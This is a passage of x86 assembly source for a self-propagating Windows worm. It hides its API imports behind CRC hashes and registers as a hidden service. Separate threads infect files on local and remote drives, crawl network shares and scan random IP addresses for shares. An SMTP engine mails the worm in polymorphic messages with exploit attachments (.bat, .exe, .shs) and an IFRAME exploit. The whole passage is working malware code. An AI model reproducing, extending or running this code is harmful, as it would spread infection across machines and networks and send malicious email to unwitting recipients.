   ;API CRC table, null terminated
   ;-----------------------------------------------------------------------------

   execrcbegin     label   near                    ;place < 80h bytes from call for smaller code
           dd      (execrc_count + 1) dup (0)
   execrcend       label   near
           dd      offset load_user32 - offset execrcend + 4

   load_user32     label   near
           call    skip_user32
           db      "user32", 0

   skip_user32     label   near
           call    dword ptr [esp + execrcstk.eLoadLibraryA + 4]
           call    init_findmz

   ;-----------------------------------------------------------------------------
   ;API CRC table, null terminated
   ;-----------------------------------------------------------------------------

   usrcrcbegin     label   near                    ;place < 80h bytes from call for smaller code
           dd      (usrcrc_count + 1) dup (0)
   usrcrcend       label   near
           dd      offset get_cmdline - offset usrcrcend + 4

   ;-----------------------------------------------------------------------------
   ;determine platform and dynamically select function types (ANSI or Unicode)
   ;-----------------------------------------------------------------------------

   get_cmdline     label   near
           mov     ebx, esp
           call    dword ptr [ebx + size usrcrcstk + execrcstk.eGetVersion]
           shr     eax, 1fh
           lea     esi, dword ptr [eax * 4 + ebx]

   ;-----------------------------------------------------------------------------
   ;RegisterServiceProcess() if 9x/Me (just sets one bit)
   ;-----------------------------------------------------------------------------

           mov     ecx, dword ptr fs:[tib.TibTeb]
           or      byte ptr [ecx + teb.procflags + 1], al

   ;-----------------------------------------------------------------------------
   ;parse command-line in platform-independent way to see how file was run
   ;-----------------------------------------------------------------------------

           dec     ax
           mov     al, 0ffh
           xchg    edi, eax                        ;ffff if Unicode, 00ff if ANSI
           mov     eax, dword ptr [esi + usrcrcstk.uCharNextW]
           mov     dword ptr ds:[offset store_charnext - offset junkmail_inf + expsize + 401001h], eax
           call    dword ptr [esi + size usrcrcstk + execrcstk.eGetCommandLineW]

   stack_delta     label   near
           mov     ebp, dword ptr [eax]
           and     ebp, edi
           cmp     ebp, '"'                        ;Unicode-compatible compare
           je      skip_argv0
           push    ' '
           pop     ebp

   skip_argv0      label   near
           push    eax
           call    dword ptr [esi + usrcrcstk.uCharNextW]
           mov     ecx, dword ptr [eax]
           and     ecx, edi
           je      argv1_skip
           cmp     ecx, ebp
           jne     skip_argv0

   find_argv1      label   near
           push    eax
           call    dword ptr [esi + usrcrcstk.uCharNextW]
           mov     ecx, dword ptr [eax]
           and     ecx, edi
           cmp     ecx, ' '                        ;Unicode-compatible compare
           je      find_argv1

   argv1_skip      label   near

   ;-----------------------------------------------------------------------------
   ;if argv1 exists then argv0 was run using shell\open\command so run argv1
   ;-----------------------------------------------------------------------------

           jecxz   stack_copy
           sub     esp, size processinfo
           mov     edx, esp
           sub     esp, size startupinfo
           mov     ecx, esp
           push    edx
           push    ecx
           xor     edx, edx
           push    edx
           push    edx
           push    edx
           push    edx
           push    edx
           push    edx
           push    eax
           push    edx
           push    ecx
           call    dword ptr [esi + size usrcrcstk + execrcstk.eGetStartupInfoW]
           call    dword ptr [esi + size usrcrcstk + execrcstk.eCreateProcessW]
           call    dword ptr [ebx + size usrcrcstk + execrcstk.eExitProcess]

   ;-----------------------------------------------------------------------------
   ;allocate stack space for RNG cache
   ;-----------------------------------------------------------------------------

   stack_copy      label   near
           mov     ebx, dword ptr [ebx + size usrcrcstk.execrcstk.eGetTickCount]
           call    ebx                             ;RNG seed
           enter   (statelen + 1) shl 2, 0         ;RNG cache
           mov     edi, esp
           call    randinit
           mov     edi, ebx
           call    find_mzhdr

   ;-----------------------------------------------------------------------------
   ;API CRC table, null terminated
   ;-----------------------------------------------------------------------------

   krncrcbegin     label   near                    ;place < 80h bytes from call for smaller code
           dd      (krncrc_count + 1) dup (0)
   krncrcend       label   near
           dd      offset swap_create - offset krncrcend + 4

   ;-----------------------------------------------------------------------------
   ;swap CreateFileW and CreateFileMappingA because of alphabet order
   ;-----------------------------------------------------------------------------

   swap_create     label   near
           mov     dword ptr ds:[offset store_krnapi - offset junkmail_inf + expsize + 401003h], esp
           mov     ebx, esp
           mov     eax, dword ptr [ebx + krncrcstk.kCreateFileMappingA]
           xchg    dword ptr [ebx + krncrcstk.kCreateFileW], eax
           mov     dword ptr [ebx + krncrcstk.kCreateFileMappingA], eax

   ;-----------------------------------------------------------------------------
   ;get SFC support if available
   ;-----------------------------------------------------------------------------

           call    load_sfc
           db      "sfc_os", 0                     ;Windows XP (forwarder chain from sfc.dll)

   load_sfc        label   near
           call    cLoadLibraryA
           test    eax, eax
           jne     found_sfc
           push    'cfs'                           ;Windows Me/2000
           push    esp
           call    cLoadLibraryA
           pop     ecx
           test    eax, eax
           je      sfcapi_esp

   found_sfc       label   near
           call    init_findmz

   ;-----------------------------------------------------------------------------
   ;API CRC table, null terminated
   ;-----------------------------------------------------------------------------

   sfccrcbegin     label   near                    ;place < 80h bytes from call for smaller code
           dd      (sfccrc_count + 1) dup (0)
   sfccrcend       label   near
           dd      offset sfcapi_pop - offset sfccrcend + 4

   sfcapi_pop      label   near
           pop     eax

   sfcapi_esp      label   near
           mov     dword ptr ds:[offset store_sfcapi - offset junkmail_inf + expsize + 401001h], eax

   ;-----------------------------------------------------------------------------
   ;get rest of APIs required for network thread
   ;-----------------------------------------------------------------------------

           push    'rpm'
           push    esp
           call    cLoadLibraryA
           pop     ecx
           call    init_findmz

   ;-----------------------------------------------------------------------------
   ;API CRC table, null terminated
   ;-----------------------------------------------------------------------------

   netcrcbegin     label   near                    ;place < 80h bytes from call for smaller code
           dd      (netcrc_count + 1) dup (0)
   netcrcend       label   near
           dd      offset netapi_esp - offset netcrcend + 4

   netapi_esp      label   near
           mov     eax, dword ptr [esp + netcrcstk.nWNetCloseEnum - netcrcstk.nWNetOpenEnumW]
           mov     dword ptr [edi + offset store_netapi - offset netapi_esp + 1], eax

   ;-----------------------------------------------------------------------------
   ;initialise service table if NT/2000/XP
   ;-----------------------------------------------------------------------------

           call    cGetVersion
           shr     eax, 1fh
           jne     svc_main                        ;no service if 9x/Me
           push    eax
           push    eax
           mov     eax, offset regdll - offset junkmail_inf + expsize + 401000h
           push    eax
           call    cLoadLibraryA
           call    init_findmz

   ;-----------------------------------------------------------------------------
   ;API CRC table, null terminated
   ;-----------------------------------------------------------------------------

   svccrcbegin     label   near                    ;place < 80h bytes from call for smaller code
           dd      (svccrc_count + 1) dup (0)
   svccrcend       label   near
           dd      offset start_disp - offset svccrcend + 4

   start_disp      label   near
           pop     eax
           mov     ecx, esp
           add     edi, offset svc_main - offset start_disp
           push    edi
           push    ecx
           push    esp
           call    eax                             ;does not return if service launch
           add     esp, size SERVICE_TABLE_ENTRY   ;fix stack if app launch

   svc_main        label   near
           push    eax
           push    esp
           xor     esi, esi
           push    esi
           push    esi
           call    create_thr1

   ;-----------------------------------------------------------------------------
   ;thread 1: infect files on all fixed and remote drive letters
   ;-----------------------------------------------------------------------------

   find_drives     proc    near
           mov     eax, '\:A'                      ;NEC-PC98 uses A: for boot drive which can be hard disk

   drive_loop      label   near
           push    eax
           push    esp
           push    (krncrcstk.kGetDriveTypeA - krncrcstk.klstrlenW) shr 2
           pop     eax
           call    store_krnapi
           sub     al, DRIVE_FIXED
           je      drive_set
           xchg    ecx, eax
           loop    drive_next                      ;loop if not DRIVE_REMOTE

   drive_set       label   near
           push    esp
           call    cSetCurrentDirectoryA
           call    find_files

   drive_next      label   near
           pop     eax
           inc     eax
           cmp     al, 'Z' + 1
           jne     drive_loop
           push    60 * 60 * 1000                  ;1 hour
           call    cSleep
           jmp     find_drives
   find_drives     endp

   create_thr1     label   near
           push    esi
           push    esi
           call    cCreateThread
           push    esp
           push    esi
           push    esi
           call    create_thr2

   ;-----------------------------------------------------------------------------
   ;thread 2: find files on network shares using non-recursive algorithm
   ;-----------------------------------------------------------------------------

           call    get_krnapis

   find_wnet       proc    near
           xor     ebx, ebx                        ;previous handle
           xor     esi, esi                        ;previous node
           xor     edi, edi                        ;previous buffer

   wnet_open       label   near
           push    eax
           push    esp
           push    edi
           push    0
           push    RESOURCETYPE_DISK
           push    RESOURCE_GLOBALNET
           call    dword ptr [ebp + netcrcstk.nWNetOpenEnumW - size netcrcstk]
           push    eax
           push    edi
           call    cGlobalFree
           pop     ecx
           pop     edi
           inc     ecx
           loop    wnet_next
           push    size wnetlist
           push    ecx                             ;GMEM_FIXED
           call    cGlobalAlloc
           mov     dword ptr [eax + wnetlist.wnetprev], esi
           mov     dword ptr [eax + wnetlist.wnethand], ebx
           xchg    esi, eax
           mov     ebx, edi

   wnet_next       label   near
           push    1
           mov     eax, esp
           push    eax
           push    esp
           push    eax
           push    ebx
           call    dword ptr [ebp + netcrcstk.nWNetEnumResourceW - size netcrcstk]
           pop     edi
           sub     al, ERROR_MORE_DATA
           jne     wnet_close
           push    edi
           push    eax                             ;GMEM_FIXED
           call    cGlobalAlloc
           xchg    ecx, eax
           jecxz   wnet_close
           push    edi
           mov     eax, esp
           push    1
           mov     edx, esp
           push    eax
           push    ecx
           push    edx
           push    ebx
           mov     edi, ecx
           call    dword ptr [ebp + netcrcstk.nWNetEnumResourceW - size netcrcstk]
           pop     ecx
           pop     ecx
           test    eax, eax
           jne     wnet_free
           test    byte ptr [edi + NETRESOURCE.dwUsage], RESOURCEUSAGE_CONTAINER
           jne     wnet_open
           push    dword ptr [edi + NETRESOURCE.lpRemoteName]
           call    dword ptr [ebp + krncrcstk.kSetCurrentDirectoryW]
           xchg    ecx, eax
           jecxz   wnet_skipdir

           ;I'm alone here
           ;with emptiness eagles and snow.
           ;Unfriendliness chilling my body
           ;and taunting with pictures of home.
           ;(Deep Purple)

           call    find_files

   wnet_skipdir    label   near
           xor     eax, eax

   wnet_free       label   near
           push    eax
           push    edi
           call    cGlobalFree
           pop     ecx
           jecxz   wnet_next

   wnet_close      label   near
           push    ebx

   store_netapi    label   near
           mov     eax, '!bgr'
           call    eax                             ;WNetCloseEnum
           mov     ecx, dword ptr [esi + wnetlist.wnetprev]
           jecxz   wnet_exit
           mov     ebx, dword ptr [esi + wnetlist.wnethand]
           push    esi
           mov     esi, ecx
           call    cGlobalFree
           jmp     wnet_next

   wnet_exit       label   near
           push    120 * 60 * 1000                 ;2 hours
           call    cSleep
           jmp     find_wnet
   find_wnet       endp

   create_thr2     label   near
           push    esi
           push    esi
           call    cCreateThread
           push    esp
           push    esi
           push    esi
           call    create_thr3

   ;-----------------------------------------------------------------------------
   ;thread 3: find files on random IP address shares using non-recursive algorithm
   ;(alter class A: 25%, class b: 25%, class c: 25%, class d: scan all)
   ;-----------------------------------------------------------------------------

           call    cGetVersion
           test    eax, eax
           mov     eax, 'aten'
           mov     ecx, '23ip'                     ;"netapi32" (NT/2000/XP)
           jns     ip_loaddll
           mov     eax, 'arvs'
           movzx   ecx, cx                         ;"svrapi" (9x/Me)

   ip_loaddll      label   near
           pushfd
           push    0
           push    ecx
           push    eax
           push    esp
           call    cLoadLibraryA
           add     esp, 0ch
           popfd
           jns     ip_getprocnt
           call    init_findmz

   ;-----------------------------------------------------------------------------
   ;API CRC table, null terminated
   ;-----------------------------------------------------------------------------

   ip9xcrcbegin    label   near                    ;place < 80h bytes from call for smaller code
           dd      (ip9xcrc_count + 1) dup (0)
   ip9xcrcend      label   near
           dd      offset ip_share - offset ip9xcrcend + 4

   ip_getprocnt    label   near
           call    init_findmz

   ;-----------------------------------------------------------------------------
   ;API CRC table, null terminated
   ;-----------------------------------------------------------------------------

   ipntcrcbegin    label   near                    ;place < 80h bytes from call for smaller code
           dd      (ipntcrc_count + 1) dup (0)
   ipntcrcend      label   near
           dd      offset ip_share - offset ipntcrcend + 4

   ip_share        label   near
           call    random
           xchg    ebp, eax                        ;initial IP address

   find_ip         proc    near
           call    random
           and     al, 18h
           je      find_ip                         ;select class A-C only
           xchg    ecx, eax
           xor     eax, eax
           mov     al, 0ffh
           shl     eax, cl                         ;select random class
           and     ecx, eax                        ;isolate new class
           not     eax
           and     ebx, eax                        ;remove old class
           or      ebx, ecx                        ;insert new class

   ip_save         label   near
           push    ebx
           bswap   ebx
           enter   34h, 0                          ;size of Unicode '\\' + Unicode IP address + '\' + ANSI sharename
           lea     edi, dword ptr [ebp - 0eh]      ;size of '\' + ANSI sharename
           call    cGetVersion
           shr     eax, 1fh                        ;0 if Unicode, 1 if ANSI
           xchg    esi, eax
           xor     al, al
           mov     cl, 0ah
           std
           stos    byte ptr [edi]
           mov     edx, edi
           stos    byte ptr [edi]                  ;store Unicode sentinel
           stos    byte ptr [edi]                  ;store Unicode half-character
           add     edi, esi                        ;remove character if ANSI

   ;-----------------------------------------------------------------------------
   ;convert IP address to string (ANSI or Unicode)
   ;-----------------------------------------------------------------------------

   ip_shift        label   near
           xor     eax, eax
           shld    eax, ebx, 8

   ip_hex2dec      label   near
           div     cl
           xchg    ah, al
           add     al, '0'
           stos    byte ptr [edi]
           xor     al, al
           stos    byte ptr [edi]                  ;store Unicode half-character
           add     edi, esi                        ;remove character if ANSI
           shr     eax, 8
           jne     ip_hex2dec
           mov     al, '.'
           stos    byte ptr [edi]
           xor     al, al
           stos    byte ptr [edi]                  ;store Unicode half-character
           add     edi, esi                        ;remove character if ANSI
           shl     ebx, 8
           jne     ip_shift
           cld
           push    edi
           mov     al, '\'
           stos    byte ptr [edi]
           inc     edi                             ;include Unicode half-character
           sub     edi, esi                        ;remove character if ANSI
           stos    byte ptr [edi]                  ;store '\\' in ANSI or Unicode
           pop     edi
           test    esi, esi
           je      ip_sharent

   ;-----------------------------------------------------------------------------
   ;enumerate shares on IP address (9x/Me platform)
   ;-----------------------------------------------------------------------------

           push    ebx
           mov     eax, esp
           push    ebx
           push    esp
           push    eax
           push    ebx                             ;too small size returns needed size
           push    ebx
           push    1
           push    edi
           mov     ebx, edi
           mov     edi, edx
           call    dword ptr [esp + 44h + ip9xcrcstk.ip9xNetShareEnum + 18h]
           pop     ecx
           pop     esi
           sub     al, ERROR_MORE_DATA
           jne     ip_restore
           imul    esi, ecx, size share_info_19x + 50
                                                   ;include size of optional remark
           push    esi
           push    eax                             ;GMEM_FIXED
           call    cGlobalAlloc
           cdq
           xchg    ecx, eax
           jecxz   ip_restore
           push    ecx                             ;GlobalFree
           push    edx
           mov     eax, esp
           push    edx
           push    esp
           push    eax
           push    esi
           push    ecx
           push    1
           push    ebx
           mov     esi, ecx
           call    dword ptr [esp + 48h + ip9xcrcstk.ip9xNetShareEnum + 18h]
           pop     ecx
           pop     ecx
           mov     al, '\'
           stos    byte ptr [edi]

   ip_next9x       label   near
           push    ecx
           push    edi
           movs    dword ptr [edi], dword ptr [esi]
           movs    dword ptr [edi], dword ptr [esi]
           movs    dword ptr [edi], dword ptr [esi]
           movs    byte ptr [edi], byte ptr [esi]  ;attach sharename
           pop     edi
           push    ebx
           call    cSetCurrentDirectoryA
           xchg    ecx, eax
           jecxz   ip_skip9x

           ;I dream of rain, I live my years under an open sky

           call    find_files

   ip_skip9x       label   near
           add     esi, size share_info_19x - share_info_19x.shi1_pad1
           pop     ecx
           loop    ip_next9x

   ip_free9x       label   near
           call    cGlobalFree

   ip_restore      label   near
           leave
           pop     ebx
           inc     bl
           jne     ip_save
           push    120 * 60 * 1000                 ;2 hours
           call    cSleep
           jmp     find_ip

   ip_sharent      label   near

   ;-----------------------------------------------------------------------------
   ;enumerate shares on IP address (NT/2000/XP platform)
   ;-----------------------------------------------------------------------------

           push    eax
           mov     eax, esp
           push    eax
           mov     ecx, esp
           push    ebx
           push    esp
           push    eax
           push    MAX_PREFERRED_LENGTH
           push    ecx
           push    1
           push    edi
           call    dword ptr [esp + 44h + ipntcrcstk.ipntNetShareEnum + 1ch]
           test    eax, eax
           pop     esi
           pop     ebx
           push    esi                             ;NetApiBufferFree
           jne     ip_freent

   ip_nextnt       label   near
           push    esi
           lods    dword ptr [esi]
           push    eax
           xchg    esi, eax
           xor     eax, eax                        ;lstrlenW
           call    store_krnapi
           lea     eax, dword ptr [eax + eax + 26h]
                                                   ;include size of Unicode '\\' + Unicode IP address + Unicode '\'
           push    eax
           push    GMEM_FIXED
           call    cGlobalAlloc
           xchg    ecx, eax
           jecxz   ip_freent
           push    ecx                             ;GlobalFree
           push    ecx                             ;SetCurrentDirectoryW
           push    esi                             ;lstrcatW
           push    ecx                             ;lstrcatW
           push    '\'
           push    esp                             ;lstrcatW
           push    ecx                             ;lstrcatW
           push    edi
           push    ecx
           push    (krncrcstk.klstrcpyW - krncrcstk.klstrlenW) shr 2
           pop     eax
           call    store_krnapi                    ;copy IP address
           call    clstrcatW                       ;attach '\'
           pop     eax
           call    clstrcatW                       ;attach sharename
           push    (krncrcstk.kSetCurrentDirectoryW - krncrcstk.klstrlenW) shr 2
           pop     eax
           call    store_krnapi
           xchg    esi, eax
           call    cGlobalFree
           test    esi, esi
           je      ip_skipnt

           ;when you look into the abyss, the abyss looks back at you

           call    find_files

   ip_skipnt       label   near
           pop     esi
           add     esi, size share_info_1nt
           dec     ebx
           jne     ip_nextnt

   ip_freent       label   near
           call    dword ptr [esp + 3ch + ipntcrcstk.ipntNetApiBufferFree + 4]
           jmp     ip_restore
   find_ip         endp

   create_thr3     label   near
           push    esi
           push    esi
           call    cCreateThread

   ;-----------------------------------------------------------------------------
   ;thread 4: send email to last mailto: address found.  slow mailer
   ;-----------------------------------------------------------------------------

           push    "23"
           push    "_2sw"
           push    esp
           call    cLoadLibraryA
           pop     ecx
           pop     ecx
           test    eax, eax
           jne     found_ws2
           push    "23k"
           push    "cosw"
           push    esp
           call    cLoadLibraryA
           pop     ecx
           pop     ecx

   found_ws2       label   near
           call    init_findmz

   ;-----------------------------------------------------------------------------
   ;API CRC table, null terminated
   ;-----------------------------------------------------------------------------

   ws2crcbegin     label   near                    ;place < 80h bytes from call for smaller code
           dd      (ws2crc_count + 1) dup (0)
   ws2crcend       label   near
           dd      offset wsock_init - offset ws2crcend + 4

   wsock_init      label   near
           mov     ebx, esp
           enter   (size WSADATA + 3) and -4, 0
           push    esp
           push    1
           call    dword ptr [ebx + ws2crcstk.wWSAStartup]
           leave
           pop     eax
           pop     dword ptr ds:[offset store_send - offset junkmail_inf + expsize + 401001h]
           push    PF_NS
           push    SOCK_STREAM
           push    AF_INET
           call    eax
           mov     dword ptr ds:[offset store_socket - offset junkmail_inf + expsize + 401001h], eax
           xchg    ebp, eax

   send_email      label   near
           push    240 * 60 * 1000                 ;4 hours
           call    cSleep
           mov     ebx, esp
           push    ebp
           push    10000h                          ;message buffer
           push    GMEM_FIXED
           call    cGlobalAlloc
           push    eax                             ;GlobalFree
           xchg    edi, eax
           mov     esi, offset email_block - offset junkmail_inf + expsize + 401000h
           push    ebx
           push    ebp
           call    decompmain                      ;smtp1 ("HELO ")
           pop     ebp
           pop     ebx
           push    esi
           mov     esi, offset mail_recip - offset junkmail_inf + expsize + 401000h

   find_smtp       label   near
           lods    byte ptr [esi]
           cmp     al, '@'
           je      store_smtp
           or      al, 5
           cmp     al, "'"
           jne     find_smtp
           pop     eax

   branch_skip     label   near
           jmp     skip_send

   store_smtp      label   near
           mov     ecx, edi
           mov     eax, "ptms"
           stos    dword ptr [edi]
           mov     al, '.'
           stos    byte ptr [edi]

   copy_smtp       label   near
           lods    byte ptr [esi]
           stos    byte ptr [edi]
           or      al, 5
           sub     al, "'"
           jne     copy_smtp
           pop     esi
           dec     edi
           mov     byte ptr [edi], al
           push    ecx
           call    dword ptr [ebx - 8 + ws2crcstk.wgethostbyname]
           xchg    ecx, eax
           jecxz   branch_skip

   ;-----------------------------------------------------------------------------
   ;create and initialise sockaddr_in structure
   ;-----------------------------------------------------------------------------

           push    0
           push    0
           push    dword ptr [ecx + hostent.h_addr_list]
           push    (1900h shl 10h) + AF_INET
           mov     eax, esp
           push    size sockaddr_in
           push    eax
           push    ebp
           call    dword ptr [ebx - 8 + ws2crcstk.wconnect]
           add     esp, size sockaddr_in
           call    store_crlf
           call    senddata

   ;-----------------------------------------------------------------------------
   ;SMTP client engine by RT Fishel
   ;polymorphic headers (random comment insertion)
   ;random subject constructed from word list
   ;random message body constructed from word list
   ;multiple exploit attachment
   ;variable attachment file format (.bat text, MZ exe, or .shs OLE2)
   ;-----------------------------------------------------------------------------

           call    decompmain                      ;smtp2 ("MAIL FROM:<>")
           call    senddata
           call    decompmain                      ;smtp3 ("RCPT TO:")
           push    esi
           mov     esi, offset mail_recip - offset junkmail_inf + expsize + 401000h

   copy_recip      label   near
           lods    byte ptr [esi]
           stos    byte ptr [edi]
           or      al, 5
           cmp     al, "'"
           jne     copy_recip
           pop     esi
           dec     edi
           call    store_crlf
           call    senddata
           call    decompmain                      ;smtp4 ("DATA")
           call    senddata
           call    decompmain                      ;header1 ("From: ")
           call    randword
           call    decompmain                      ;header2 ("Subject: ")
           call    decomprand
           call    randword
           dec     edi
           dec     edi
           call    decompcmap                      ;header31 ("MIME-Version:")
           xor     ebp, ebp
           call    decompcomcr                     ;header32 ("1.0")
           call    decompcmap                      ;part11 ("Content-Type:")
           push    offset part12 - offset part11 - 2
           pop     ebp
           call    decompcomcr                     ;part12 ("multipart/mixed;")
           xor     ebp, ebp
           call    decompcomnt                     ;part13 (" boundary=")
           push    edi
           call    randword                        ;boundary
           call    store_crlf
           mov     eax, edi
           pop     ecx
           push    ecx                             ;boundary pointer
           sub     eax, ecx
           sub     eax, 4
           push    eax                             ;boundary length
           call    randlines
           pop     eax
           pop     ecx
           push    ecx
           push    eax
           call    bound_copy                      ;boundary
           dec     edi
           dec     edi
           mov     eax, (0a0dh shl 10h) + '--'
           stos    dword ptr [edi]                 ;end of message ;)
           stos    word ptr [edi]
           pop     eax
           pop     ecx
           push    ecx
           push    eax
           call    bound_copy                      ;--boundary
           call    decompmain                      ;body1 ("I received this file...")
           call    decomptype                      ;content-type
           call    decompcmap                      ;part22 ("Content-Transfer-Encoding:")
           call    decompcomnt                     ;part23 ("quoted-printable")
           call    decompoct                       ;part24 ("<IFRAME...")
           call    decomptype                      ;content-type
           call    store_crlf
           push    edi
           call    decompmain                      ;part31 (" name=email")
           call    decomprand
           call    decompmain                      ;suffix2
           pop     edx
           pop     eax
           pop     ecx
           push    dword ptr [edi - 3]             ;save suffix before morph
           push    ecx
           push    eax
           push    esi
           push    71
           pop     ebp
           xchg    edx, eax
           call    decompname                      ;morph " name=email.xxx.yyy"

   patch_encode    label   near
           mov     esi, 'RTF!'
           call    decompcmap                      ;content-encoding
           xchg    esi, eax
           pop     esi
           push    eax
           push    edi
           push    ebp
           call    decompcomnt                     ;part32 ("base64")
           pop     ebp
           pop     eax
           pop     ecx
           cmp     byte ptr [esp + 8], 'B'         ;.bat
           jne     decode_cid
           xchg    edi, eax
           push    esi
           mov     esi, ecx
           call    decompcomnt                     ;part23 ("quoted-printable")
           pop     esi

   decode_cid      label   near
           call    decompcmap                      ;part33 ("Content-ID")
           push    offset part34 - offset part33 - 4
           pop     ebp
           call    decompcomcr                     ;part34 (ourcid)
           call    store_crlf
           push    edi
           call    decompoct                       ;batdrop1
           pop     eax
           push    esi
           push    eax
           mov     esi, edi
           call    randword
           dec     edi
           dec     edi
           mov     eax, "EXE."
           stos    dword ptr [edi]
           mov     al, 'X'                         ;bit 0 must be clear
           stos    byte ptr [edi]                  ;6-byte align
           push    edi
           mov     al, '>'
           stos    byte ptr [edi]
           movs    dword ptr [edi], dword ptr [esi]
           movs    dword ptr [edi], dword ptr [esi]
           movs    dword ptr [edi], dword ptr [esi]
           call    store_crlf
           pop     eax
           xchg    dword ptr [esp], eax
           cmp     byte ptr [esp + 10h], 'B'       ;.bat
           je      encode_body
           xchg    edi, eax

   encode_body     label   near
           xor     ebp, ebp
           push    ebp                             ;CreateFileA
           push    ebp                             ;CreateFileA
           push    OPEN_EXISTING                   ;CreateFileA
           push    ebp                             ;CreateFileA
           push    FILE_SHARE_READ                 ;CreateFileA
           push    GENERIC_READ                    ;CreateFileA
           push    edi                             ;CreateFileA
           push    7fh
           push    edi
           push    ebp
           push    (krncrcstk.kGetModuleFileNameA - krncrcstk.klstrlenW) shr 2
           pop     eax
           call    store_krnapi
           push    (krncrcstk.kCreateFileA - krncrcstk.klstrlenW) shr 2
           pop     eax
           call    store_krnapi
           push    ebp
           push    eax
           xchg    ebx, eax
           push    (krncrcstk.kGetFileSize - krncrcstk.klstrlenW) shr 2
           pop     eax
           call    store_krnapi
           mov     esi, scrapsize
           lea     ecx, dword ptr [eax + esi]      ;include scrap header size
           xchg    ebp, eax
           push    ecx
           push    GMEM_ZEROINIT
           call    cGlobalAlloc
           push    eax                             ;GlobalFree
           push    ebx                             ;CloseHandle
           push    eax
           push    esp
           push    ebp
           lea     ecx, dword ptr [eax + esi]      ;allow space for scrap header
           push    ecx
           push    ebx
           xchg    ebx, eax
           push    (krncrcstk.kReadFile - krncrcstk.klstrlenW) shr 2
           pop     eax
           call    store_krnapi
           call    cCloseHandle
           cmp     byte ptr [esp + 15h], 'H'       ;.shs
           jne     encode_exe                      ;cannot check first character because of .scr
           call    decompscrap

   encode_exe      label   near
           add     esi, ebx
           push    edi
           call    b64encode
           pop     esi
           call    cGlobalFree
           pop     ebx
           cmp     byte ptr [esp + 0ch], 'B'       ;.bat
           jne     decode_tail
           call    decompbat

   decode_tail     label   near
           mov     eax, ('--' shl 10h) + 0a0dh
           stos    dword ptr [edi]
           pop     esi
           pop     eax
           pop     ecx
           pop     edx
           call    bound_copy
           call    randlines
           call    decompmain                      ;part35
           call    senddata
           call    decompmain                      ;part36
           call    senddata

   skip_send       label   near
           call    cGlobalFree
           pop     ebp
           jmp     send_email

   email_block     label   near
   include email.inc

   ;-----------------------------------------------------------------------------
   ;Mersenne Twister RNG MT19937 (c) 1997 Makoto Matsumoto and Takuji Nishimura
   ;period is ((2^19937)-1) with 623-dimensionally equidistributed sequence
   ;asm port and size optimise by rgb in 2002
   ;-----------------------------------------------------------------------------

   randinit        proc    near                    ;eax = seed, ecx = 0, edi -> RNG cache
           pushad
           push    edi
           or      eax, 1
           mov     cx, statelen

   init_loop       label   near
           stos    dword ptr [edi]
           mov     edx, 69069
           mul     edx                             ;Knuth: x_new = x_old * 69069
           loop    init_loop
           inc     ecx                             ;force reload
           call    initdelta

   initdelta       label   near
           pop     edi
           add     edi, offset randvars - offset initdelta
           xchg    ecx, eax
           stos    dword ptr [edi]
           pop     eax
           stos    dword ptr [edi]
           stos    dword ptr [edi]
           popad
           ret
   randinit        endp

   random          proc    near
           pushad
           call    randelta

   randvars        label   near
           db      'rgb!'                          ;numbers left
           db      'rgb!'                          ;next pointer
           db      'rgb!'                          ;state pointer

   randelta        label   near
           pop     esi
           push    esi
           lods    dword ptr [esi]
           xchg    ecx, eax
           lods    dword ptr [esi]
           xchg    esi, eax
           loop    random_ret
           mov     cx, statelen - period
           mov     esi, dword ptr [eax]
           lea     ebx, dword ptr [esi + (period * 4)]
           mov     edi, esi
           push    esi
           lods    dword ptr [esi]
           xchg    edx, eax
           call    twist
           pop     ebx
           mov     cx, period - 1
           push    ecx
           push    ebx
           call    twist
           pop     esi
           push    esi
           inc     ecx
           call    twist
           xchg    edx, eax
           pop     esi
           pop     ecx
           inc     ecx

   random_ret      label   near
           lods    dword ptr [esi]
           mov     edx, eax
           shr     eax, tshiftU
           xor     eax, edx
           mov     edx, eax
           shl     eax, tshiftS
           and     eax, tmaskB
           xor     eax, edx
           mov     edx, eax
           shl     eax, tshiftT
           and     eax, tmaskC
           xor     eax, edx
           mov     edx, eax
           shr     eax, tshiftL
           xor     eax, edx
           pop     edi
           mov     dword ptr [esp + 1ch], eax      ;eax in pushad
           xchg    ecx, eax
           stos    dword ptr [edi]
           xchg    esi, eax
           stos    dword ptr [edi]
           popad
           ret
   random          endp

   twist           proc    near
           lods    dword ptr [esi]
           push    eax
           add     eax, eax                        ;remove highest bit
           add     edx, edx                        ;test highest bit
           rcr     eax, 2                          ;merge bits and test lowest bit
           jnb     twist_skip                      ;remove branch but larger using:
           xor     eax, matrixA                    ;sbb edx, edx+and edx, matrixA+xor eax, edx

   twist_skip      label   near
           xor     eax, dword ptr [ebx]
           add     ebx, 4
           stos    dword ptr [edi]
           pop     edx
           loop    twist
           ret
   twist           endp

   senddata        proc    near
           pop     ecx
           pop     eax
           push    eax
           push    0
           sub     edi, eax
           push    edi
           push    eax

   store_socket    label   near
           push    "!bgr"
           push    ecx
           xchg    edi, eax

   store_send      label   near
           push    "!bgr"
           ret
   senddata        endp

   ;-----------------------------------------------------------------------------
   ;non-recursive directory traverser
   ;-----------------------------------------------------------------------------

   find_files      proc    near
           pushad
           push    size findlist
           push    GMEM_ZEROINIT
           call    cGlobalAlloc
           test    eax, eax
           je      file_exit
           xchg    esi, eax
           call    get_krnapis

   file_first      label   near
           push    '*'                             ;ANSI-compatible Unicode findmask
           mov     eax, esp
           lea     ebx, dword ptr [esi + findlist.finddata]
           push    ebx
           push    eax
           call    dword ptr [ebp + krncrcstk.kFindFirstFileW]
           pop     ecx
           mov     dword ptr [esi + findlist.findhand], eax
           inc     eax
           je      file_prev

           ;you must always step forward from where you stand

   test_dirfile    label   near
           mov     eax, dword ptr [ebx + WIN32_FIND_DATA.dwFileAttributes]
           lea     edi, dword ptr [esi + findlist.finddata.cFileName]
           test    al, FILE_ATTRIBUTE_DIRECTORY
           je      test_file
           cmp     byte ptr [edi], '.'             ;ignore . and .. (but also .* directories under NT/2000/XP)
           je      file_next

   ;-----------------------------------------------------------------------------
   ;enter subdirectory, and allocate another list node
   ;-----------------------------------------------------------------------------

           push    edi
           call    dword ptr [ebp + krncrcstk.kSetCurrentDirectoryW]
           xchg    ecx, eax
           jecxz   file_next
           push    size findlist
           push    GMEM_FIXED
           call    cGlobalAlloc
           xchg    ecx, eax
           jecxz   step_updir
           xchg    esi, ecx
           mov     dword ptr [esi + findlist.findprev], ecx
           jmp     file_first

   file_exit       label   near
           popad
           ret

   file_next       label   near
           lea     ebx, dword ptr [esi + findlist.finddata]
           push    ebx
           mov     edi, dword ptr [esi + findlist.findhand]
           push    edi
